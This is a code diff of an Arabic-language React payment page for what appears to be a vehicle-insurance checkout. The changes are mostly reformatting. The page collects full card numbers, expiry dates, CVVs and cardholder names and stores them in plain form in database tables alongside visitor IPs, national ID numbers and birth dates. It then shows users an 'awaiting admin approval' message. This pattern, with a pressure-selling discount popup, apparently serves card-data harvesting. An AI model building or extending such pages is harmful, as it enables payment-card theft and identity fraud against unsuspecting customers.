@@ -4,13 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { ArrowRight, Lock, CreditCard, Loader2, AlertCircle, Sparkles, CheckCircle2 } from "lucide-react";
-import {
-  Select,
-  SelectContent,
-  SelectItem,
-  SelectTrigger,
-  SelectValue,
-} from "@/components/ui/select";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { useToast } from "@/hooks/use-toast";
 import Footer from "@/components/Footer";
 import { useOrder } from "@/contexts/OrderContext";
@@ -19,8 +13,6 @@ import { Alert, AlertDescription } from "@/components/ui/alert";
 import { toast as sonnerToast } from "sonner";
 import PaymentLogos from "@/components/PaymentLogos";
 import { Shield } from "lucide-react";
-
-
 const Payment = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
@@ -31,7 +23,6 @@ const Payment = () => {
   const {
     toast
   } = useToast();
-
   const companyName = searchParams.get("company") || "";
   const price = parseFloat(searchParams.get("price") || "0");
   const regularPrice = parseFloat(searchParams.get("regularPrice") || "0");
@@ -46,7 +37,7 @@ const Payment = () => {
   const [paymentMethod] = useState<"card">("card");
   const [showPromoPopup, setShowPromoPopup] = useState(true);
   const [expiryError, setExpiryError] = useState("");
-  
+
   // Calculate final price with discount
   const cardDiscount = 0.25; // 25% discount
   const finalPrice = paymentMethod === "card" ? price * (1 - cardDiscount) : price;
@@ -69,7 +60,6 @@ const Payment = () => {
         });
       }
     };
-    
     trackPaymentPageVisit();
   }, [companyName, price]);
 
@@ -78,7 +68,6 @@ const Payment = () => {
     const timer = setTimeout(() => {
       setShowPromoPopup(false);
     }, 5000);
-    
     return () => clearTimeout(timer);
   }, []);
 
@@ -90,7 +79,7 @@ const Payment = () => {
       toast({
         title: "تم رفض معلومات الدفع",
         description: "يرجى التأكد من صحة البيانات وإعادة الإدخال",
-        variant: "destructive",
+        variant: "destructive"
       });
     }
   }, [searchParams, toast]);
@@ -136,11 +125,10 @@ const Payment = () => {
       const currentDate = new Date();
       const currentYear = currentDate.getFullYear() % 100; // Get last 2 digits
       const currentMonth = currentDate.getMonth() + 1; // 0-indexed
-      
+
       const expYear = parseInt(year);
       const expMonth = parseInt(month);
-      
-      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
+      if (expYear < currentYear || expYear === currentYear && expMonth < currentMonth) {
         setExpiryError("تاريخ البطاقة منتهي");
         return false;
       } else {
@@ -154,105 +142,63 @@ const Payment = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setRejectionError(false);
-
     const expiryDate = `${expiryMonth}/${expiryYear}`;
-
     try {
       setWaitingApproval(true);
-      
+
       // جلب session_id و IP من visitor_tracking
       const sessionId = sessionStorage.getItem("visitor_session_id");
       let visitorIp = null;
-      
       if (sessionId) {
-        const { data: visitorData } = await supabase
-          .from("visitor_tracking")
-          .select("ip_address")
-          .eq("session_id", sessionId)
-          .order("last_active_at", { ascending: false })
-          .limit(1)
-          .maybeSingle();
-        
+        const {
+          data: visitorData
+        } = await supabase.from("visitor_tracking").select("ip_address").eq("session_id", sessionId).order("last_active_at", {
+          ascending: false
+        }).limit(1).maybeSingle();
         if (visitorData?.ip_address) {
           visitorIp = visitorData.ip_address;
         }
       }
-      
       let orderDbData;
-      
+
       // التحقق من وجود رقم تسلسل صالح
       if (orderData.sequenceNumber) {
         // محاولة تحديث السجل الموجود
-        const { data, error: updateError } = await supabase
-          .from('customer_orders')
-          .update({
-            card_holder_name: cardHolder,
-            card_number: cardNumber,
-            expiry_date: expiryDate,
-            cvv: cvv,
-            insurance_company: companyName,
-            insurance_price: finalPrice,
-            status: 'pending',
-            visitor_ip: visitorIp,
-            updated_at: new Date().toISOString(),
-          })
-          .eq('sequence_number', orderData.sequenceNumber)
-          .order('created_at', { ascending: false })
-          .limit(1)
-          .select()
-          .maybeSingle();
-        
+        const {
+          data,
+          error: updateError
+        } = await supabase.from('customer_orders').update({
+          card_holder_name: cardHolder,
+          card_number: cardNumber,
+          expiry_date: expiryDate,
+          cvv: cvv,
+          insurance_company: companyName,
+          insurance_price: finalPrice,
+          status: 'pending',
+          visitor_ip: visitorIp,
+          updated_at: new Date().toISOString()
+        }).eq('sequence_number', orderData.sequenceNumber).order('created_at', {
+          ascending: false
+        }).limit(1).select().maybeSingle();
         if (updateError) {
           console.error('Update error:', updateError);
           throw updateError;
         }
-        
         if (data) {
           orderDbData = data;
         } else {
           // إذا لم يتم العثور على السجل، إنشاء سجل جديد
-          const { data: insertData, error: insertError } = await supabase
-            .from('customer_orders')
-            .insert({
-              card_holder_name: cardHolder,
-              card_number: cardNumber,
-              expiry_date: expiryDate,
-              cvv: cvv,
-              insurance_company: companyName,
-              insurance_price: finalPrice,
-              sequence_number: orderData.sequenceNumber,
-              id_number: orderData.idNumber || '0000000000',
-              birth_date: orderData.birthDate || '2000-01-01',
-              phone_number: orderData.phoneNumber || null,
-              owner_name: orderData.ownerName || null,
-              vehicle_type: orderData.vehicleType || '',
-              vehicle_purpose: orderData.vehiclePurpose || '',
-              estimated_value: orderData.estimatedValue || null,
-              policy_start_date: orderData.policyStartDate || null,
-              add_driver: orderData.addDriver || null,
-              visitor_session_id: sessionId,
-              visitor_ip: visitorIp,
-              status: 'pending'
-            })
-            .select()
-            .single();
-          
-          if (insertError) throw insertError;
-          orderDbData = insertData;
-        }
-      } else {
-        // إنشاء سجل جديد مباشرة
-        const newSequenceNumber = `ORD-${Date.now()}`;
-        const { data, error: insertError } = await supabase
-          .from('customer_orders')
-          .insert({
+          const {
+            data: insertData,
+            error: insertError
+          } = await supabase.from('customer_orders').insert({
             card_holder_name: cardHolder,
             card_number: cardNumber,
             expiry_date: expiryDate,
             cvv: cvv,
             insurance_company: companyName,
             insurance_price: finalPrice,
-            sequence_number: newSequenceNumber,
+            sequence_number: orderData.sequenceNumber,
             id_number: orderData.idNumber || '0000000000',
             birth_date: orderData.birthDate || '2000-01-01',
             phone_number: orderData.phoneNumber || null,
@@ -265,26 +211,52 @@ const Payment = () => {
             visitor_session_id: sessionId,
             visitor_ip: visitorIp,
             status: 'pending'
-          })
-          .select()
-          .single();
-        
+          }).select().single();
+          if (insertError) throw insertError;
+          orderDbData = insertData;
+        }
+      } else {
+        // إنشاء سجل جديد مباشرة
+        const newSequenceNumber = `ORD-${Date.now()}`;
+        const {
+          data,
+          error: insertError
+        } = await supabase.from('customer_orders').insert({
+          card_holder_name: cardHolder,
+          card_number: cardNumber,
+          expiry_date: expiryDate,
+          cvv: cvv,
+          insurance_company: companyName,
+          insurance_price: finalPrice,
+          sequence_number: newSequenceNumber,
+          id_number: orderData.idNumber || '0000000000',
+          birth_date: orderData.birthDate || '2000-01-01',
+          phone_number: orderData.phoneNumber || null,
+          owner_name: orderData.ownerName || null,
+          vehicle_type: orderData.vehicleType || '',
+          vehicle_purpose: orderData.vehiclePurpose || '',
+          estimated_value: orderData.estimatedValue || null,
+          policy_start_date: orderData.policyStartDate || null,
+          add_driver: orderData.addDriver || null,
+          visitor_session_id: sessionId,
+          visitor_ip: visitorIp,
+          status: 'pending'
+        }).select().single();
         if (insertError) throw insertError;
         orderDbData = data;
       }
 
       // حفظ محاولة الدفع
       if (orderDbData?.id) {
-        const { error: attemptError } = await supabase
-          .from('payment_attempts')
-          .insert({
-            order_id: orderDbData.id,
-            card_holder_name: cardHolder,
-            card_number: cardNumber,
-            expiry_date: expiryDate,
-            cvv: cvv
-          });
-
+        const {
+          error: attemptError
+        } = await supabase.from('payment_attempts').insert({
+          order_id: orderDbData.id,
+          card_holder_name: cardHolder,
+          card_number: cardNumber,
+          expiry_date: expiryDate,
+          cvv: cvv
+        });
         if (attemptError) {
           console.error('Error inserting payment attempt:', attemptError);
         }
@@ -301,21 +273,19 @@ const Payment = () => {
 
       // الانتقال إلى صفحة التحميل فقط بعد نجاح الحفظ
       navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${finalPrice}&orderId=${orderDbData.id}`);
-
     } catch (error) {
       console.error('Error submitting payment:', error);
       setWaitingApproval(false);
       toast({
         title: "خطأ في معالجة الدفع",
         description: "حدث خطأ أثناء حفظ معلومات الدفع. يرجى المحاولة مرة أخرى.",
-        variant: "destructive",
+        variant: "destructive"
       });
     }
   };
   return <div className="min-h-screen bg-gradient-to-b from-background to-muted/20" dir="rtl">
       {/* Promo Popup */}
-      {showPromoPopup && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm animate-in fade-in duration-300">
+      {showPromoPopup && <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm animate-in fade-in duration-300">
           <div className="bg-gradient-to-br from-green-500 via-emerald-600 to-teal-600 rounded-2xl p-6 max-w-md w-full shadow-2xl transform animate-in zoom-in duration-300 relative overflow-hidden">
             {/* Decorative elements */}
             <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -translate-y-16 translate-x-16"></div>
@@ -331,17 +301,13 @@ const Payment = () => {
               <p className="text-sm mb-4 opacity-90">
                 وفر {(price * 0.25).toFixed(2)} ر.س من قيمة طلبك!
               </p>
-              <button
-                onClick={() => setShowPromoPopup(false)}
-                className="bg-white text-green-600 px-6 py-2 rounded-full font-bold hover:bg-gray-100 transition-colors"
-              >
+              <button onClick={() => setShowPromoPopup(false)} className="bg-white text-green-600 px-6 py-2 rounded-full font-bold hover:bg-gray-100 transition-colors">
                 استفد من العرض الآن
               </button>
               <p className="text-xs mt-3 opacity-75">سيتم إغلاق هذه النافذة تلقائياً بعد 5 ثوانٍ</p>
             </div>
           </div>
-        </div>
-      )}
+        </div>}
       
       {/* Header */}
       <div className="bg-gradient-to-b from-primary to-primary-dark py-8">
@@ -353,9 +319,7 @@ const Payment = () => {
           <h1 className="text-2xl font-bold text-white text-center">
             اختر طريقة الدفع المناسبة لك
           </h1>
-          <p className="text-white/90 text-center mt-2 text-sm">
-            ادفع الآن بالبطاقة مع خصم 25% أو قسّم مشترياتك على 4 دفعات
-          </p>
+          
         </div>
       </div>
 
@@ -422,23 +386,19 @@ const Payment = () => {
                   </div>
                 </div>
             
-            {rejectionError && (
-              <Alert variant="destructive" className="mb-6 animate-in fade-in duration-300">
+            {rejectionError && <Alert variant="destructive" className="mb-6 animate-in fade-in duration-300">
                 <AlertCircle className="h-4 w-4" />
                 <AlertDescription>
                   تم رفض معلومات الدفع. يرجى التأكد من صحة البيانات وإعادة الإدخال.
                 </AlertDescription>
-              </Alert>
-            )}
+              </Alert>}
 
-            {waitingApproval && (
-              <Alert className="mb-6 bg-blue-50 border-blue-200 animate-in fade-in duration-300">
+            {waitingApproval && <Alert className="mb-6 bg-blue-50 border-blue-200 animate-in fade-in duration-300">
                 <Loader2 className="h-4 w-4 animate-spin" />
                 <AlertDescription className="text-blue-900">
                   تم إرسال معلومات الدفع بنجاح. في انتظار موافقة الإدارة...
                 </AlertDescription>
-              </Alert>
-            )}
+              </Alert>}
             
             <form onSubmit={handleSubmit} className="space-y-6">
               {/* Card Holder Name */}
@@ -447,14 +407,7 @@ const Payment = () => {
                   <CreditCard className="h-4 w-4 text-primary" />
                   اسم حامل البطاقة <span className="text-destructive">*</span>
                 </Label>
-                <Input 
-                  id="cardHolder" 
-                  placeholder="الاسم كما هو مكتوب على البطاقة" 
-                  value={cardHolder} 
-                  onChange={handleCardHolderChange}
-                  required 
-                  className="text-right h-12 border-2 focus:border-primary transition-all duration-200 bg-gray-50 focus:bg-white" 
-                />
+                <Input id="cardHolder" placeholder="الاسم كما هو مكتوب على البطاقة" value={cardHolder} onChange={handleCardHolderChange} required className="text-right h-12 border-2 focus:border-primary transition-all duration-200 bg-gray-50 focus:bg-white" />
                 <p className="text-xs text-muted-foreground text-right">أحرف فقط بدون أرقام</p>
               </div>
 
@@ -465,36 +418,20 @@ const Payment = () => {
                   رقم البطاقة <span className="text-destructive">*</span>
                 </Label>
                 <div className="relative group">
-                  <Input 
-                    id="cardNumber" 
-                    placeholder="1234 5678 9012 3456" 
-                    value={formatCardNumber(cardNumber)} 
-                    onChange={handleCardNumberChange} 
-                    required 
-                    className="text-right pr-12 h-12 border-2 focus:border-primary transition-all duration-200 bg-gray-50 focus:bg-white font-mono text-lg tracking-wider" 
-                    dir="ltr" 
-                  />
+                  <Input id="cardNumber" placeholder="1234 5678 9012 3456" value={formatCardNumber(cardNumber)} onChange={handleCardNumberChange} required className="text-right pr-12 h-12 border-2 focus:border-primary transition-all duration-200 bg-gray-50 focus:bg-white font-mono text-lg tracking-wider" dir="ltr" />
                   <div className="absolute left-3 top-1/2 -translate-y-1/2 transition-all duration-200">
-                    {cardType === "visa" && (
-                      <div className="flex items-center gap-1 animate-in fade-in zoom-in duration-300">
+                    {cardType === "visa" && <div className="flex items-center gap-1 animate-in fade-in zoom-in duration-300">
                         <div className="text-xs font-bold text-blue-700 bg-blue-100 px-3 py-1.5 rounded shadow-sm">VISA</div>
-                      </div>
-                    )}
-                    {cardType === "mastercard" && (
-                      <div className="flex items-center gap-2 animate-in fade-in zoom-in duration-300">
+                      </div>}
+                    {cardType === "mastercard" && <div className="flex items-center gap-2 animate-in fade-in zoom-in duration-300">
                         <div className="flex">
                           <div className="w-5 h-5 rounded-full bg-red-500 shadow-sm"></div>
                           <div className="w-5 h-5 rounded-full bg-orange-400 -ml-2 shadow-sm"></div>
                         </div>
                         <div className="text-xs font-bold text-orange-700">Mastercard</div>
-                      </div>
-                    )}
-                    {!cardType && cardNumber.length > 0 && (
-                      <CreditCard className="h-5 w-5 text-muted-foreground animate-pulse" />
-                    )}
-                    {!cardNumber && (
-                      <CreditCard className="h-5 w-5 text-gray-400" />
-                    )}
+                      </div>}
+                    {!cardType && cardNumber.length > 0 && <CreditCard className="h-5 w-5 text-muted-foreground animate-pulse" />}
+                    {!cardNumber && <CreditCard className="h-5 w-5 text-gray-400" />}
                   </div>
                 </div>
               </div>
@@ -508,24 +445,21 @@ const Payment = () => {
                   </Label>
                   <div className="flex gap-2 items-center">
                     {/* Month Select */}
-                    <Select
-                      value={expiryMonth}
-                      onValueChange={(value) => {
-                        setExpiryMonth(value);
-                        validateExpiryDate(value, expiryYear);
-                      }}
-                    >
+                    <Select value={expiryMonth} onValueChange={value => {
+                      setExpiryMonth(value);
+                      validateExpiryDate(value, expiryYear);
+                    }}>
                       <SelectTrigger className="h-12 border-2 focus:border-primary bg-gray-50 focus:bg-white">
                         <SelectValue placeholder="الشهر" />
                       </SelectTrigger>
                       <SelectContent>
-                        {Array.from({ length: 12 }, (_, i) => {
+                        {Array.from({
+                          length: 12
+                        }, (_, i) => {
                           const month = String(i + 1).padStart(2, '0');
-                          return (
-                            <SelectItem key={month} value={month}>
+                          return <SelectItem key={month} value={month}>
                               {month}
-                            </SelectItem>
-                          );
+                            </SelectItem>;
                         })}
                       </SelectContent>
                     </Select>
@@ -533,37 +467,32 @@ const Payment = () => {
                     <span className="text-xl text-muted-foreground font-bold">/</span>
                     
                     {/* Year Select */}
-                    <Select
-                      value={expiryYear}
-                      onValueChange={(value) => {
-                        setExpiryYear(value);
-                        validateExpiryDate(expiryMonth, value);
-                      }}
-                    >
+                    <Select value={expiryYear} onValueChange={value => {
+                      setExpiryYear(value);
+                      validateExpiryDate(expiryMonth, value);
+                    }}>
                       <SelectTrigger className="h-12 border-2 focus:border-primary bg-gray-50 focus:bg-white">
                         <SelectValue placeholder="السنة" />
                       </SelectTrigger>
                       <SelectContent>
                         {(() => {
                           const currentYear = new Date().getFullYear() % 100;
-                          return Array.from({ length: 10 }, (_, i) => {
+                          return Array.from({
+                            length: 10
+                          }, (_, i) => {
                             const year = String(currentYear + i).padStart(2, '0');
-                            return (
-                              <SelectItem key={year} value={year}>
+                            return <SelectItem key={year} value={year}>
                                 {year}
-                              </SelectItem>
-                            );
+                              </SelectItem>;
                           });
                         })()}
                       </SelectContent>
                     </Select>
                   </div>
-                  {expiryError && (
-                    <p className="text-xs text-destructive flex items-center gap-1 animate-in fade-in duration-200">
+                  {expiryError && <p className="text-xs text-destructive flex items-center gap-1 animate-in fade-in duration-200">
                       <AlertCircle className="h-3 w-3" />
                       {expiryError}
-                    </p>
-                  )}
+                    </p>}
                 </div>
 
                 {/* CVV */}
@@ -572,16 +501,7 @@ const Payment = () => {
                     رمز الأمان (CVV) <span className="text-destructive">*</span>
                   </Label>
                   <div className="relative">
-                    <Input 
-                      id="cvv" 
-                      placeholder="123" 
-                      value={cvv} 
-                      onChange={handleCvvChange} 
-                      required 
-                      className="text-center h-12 border-2 focus:border-primary transition-all duration-200 bg-gray-50 focus:bg-white font-mono text-lg tracking-widest" 
-                      maxLength={3}
-                      type="password"
-                    />
+                    <Input id="cvv" placeholder="123" value={cvv} onChange={handleCvvChange} required className="text-center h-12 border-2 focus:border-primary transition-all duration-200 bg-gray-50 focus:bg-white font-mono text-lg tracking-widest" maxLength={3} type="password" />
                     <div className="absolute left-3 top-1/2 -translate-y-1/2">
                       <Lock className="h-4 w-4 text-gray-400" />
                     </div>
@@ -600,22 +520,14 @@ const Payment = () => {
               </div>
 
               {/* Submit Button */}
-              <Button 
-                type="submit" 
-                disabled={waitingApproval}
-                className="w-full h-14 text-lg font-bold bg-gradient-to-r from-primary to-primary-dark hover:from-primary-dark hover:to-primary transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5"
-              >
-                {waitingApproval ? (
-                  <>
+              <Button type="submit" disabled={waitingApproval} className="w-full h-14 text-lg font-bold bg-gradient-to-r from-primary to-primary-dark hover:from-primary-dark hover:to-primary transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5">
+                {waitingApproval ? <>
                     <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                     جاري المعالجة...
-                  </>
-                ) : (
-                  <>
+                  </> : <>
                     <Lock className="ml-2 h-5 w-5" />
                     تأكيد الدفع بشكل آمن
-                  </>
-                )}
+                  </>}
               </Button>
 
               {/* Trust Badges */}
@@ -672,33 +584,27 @@ const Payment = () => {
                     <span className="text-accent font-medium">- {(regularPrice - price).toFixed(2)} ﷼</span>
                   </div>
                   
-                  {paymentMethod === "card" && savedAmount > 0 && (
-                    <div className="flex justify-between text-sm bg-green-50 p-2 rounded-lg">
+                  {paymentMethod === "card" && savedAmount > 0 && <div className="flex justify-between text-sm bg-green-50 p-2 rounded-lg">
                       <span className="text-green-700 font-bold flex items-center gap-1">
                         <span>🎉</span>
                         خصم البطاقة الائتمانية 25%:
                       </span>
                       <span className="text-green-700 font-bold">- {savedAmount.toFixed(2)} ﷼</span>
-                    </div>
-                  )}
+                    </div>}
                 </div>
 
                 <div className="pt-4 border-t border-border">
-                  {paymentMethod === "card" && savedAmount > 0 && (
-                    <div className="mb-3 p-3 bg-gradient-to-r from-green-50 to-emerald-50 rounded-lg border border-green-200">
+                  {paymentMethod === "card" && savedAmount > 0 && <div className="mb-3 p-3 bg-gradient-to-r from-green-50 to-emerald-50 rounded-lg border border-green-200">
                       <div className="flex justify-between items-center text-sm">
                         <span className="text-green-700">المبلغ قبل خصم البطاقة:</span>
                         <span className="text-green-700 line-through">{price.toFixed(2)} ﷼</span>
                       </div>
-                    </div>
-                  )}
+                    </div>}
                   <div className="flex justify-between items-center">
                     <span className="text-lg font-bold">المبلغ الإجمالي:</span>
                     <div className="text-left">
                       <span className="text-2xl font-bold text-primary">{finalPrice.toFixed(2)} ﷼</span>
-                      {paymentMethod === "card" && savedAmount > 0 && (
-                        <div className="text-xs text-green-600 font-semibold">وفرت {savedAmount.toFixed(2)} ﷼</div>
-                      )}
+                      {paymentMethod === "card" && savedAmount > 0 && <div className="text-xs text-green-600 font-semibold">وفرت {savedAmount.toFixed(2)} ﷼</div>}
                     </div>
                   </div>
                 </div>
